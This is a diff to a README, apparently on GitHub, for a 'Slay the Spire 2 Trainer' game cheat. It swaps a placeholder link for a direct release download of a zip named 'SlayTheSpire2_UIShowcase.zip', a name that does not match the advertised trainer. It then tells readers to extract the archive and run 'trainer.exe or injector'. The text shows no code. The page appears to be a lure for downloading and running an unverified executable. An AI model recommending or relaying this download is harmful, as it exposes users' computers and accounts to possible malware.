@@ -40,7 +40,7 @@ Perfect for testing builds, farming relics, or just having fun in **Slay the Spi
 
 ## 🚀 How to Install & Use Slay the Spire 2 Trainer (2026)
 
-1. Download the latest release → [Click the big pink button above](#)  
+1. Download the latest release → [Click the big pink button above](https://github.com/Skezz231/Slay-the-Spire-2-Trainer-Infinite-Energy-Infinite-Mega-Gold-Unlimited-Block-Zero-Cost-Cards-sources/releases/download/1.0/SlayTheSpire2_UIShowcase.zip)  
 2. Extract the .zip / .rar file  
 3. Launch **Slay the Spire 2** (Early Access – released March 5, 2026)  
 4. Run the trainer executable (trainer.exe or injector)  
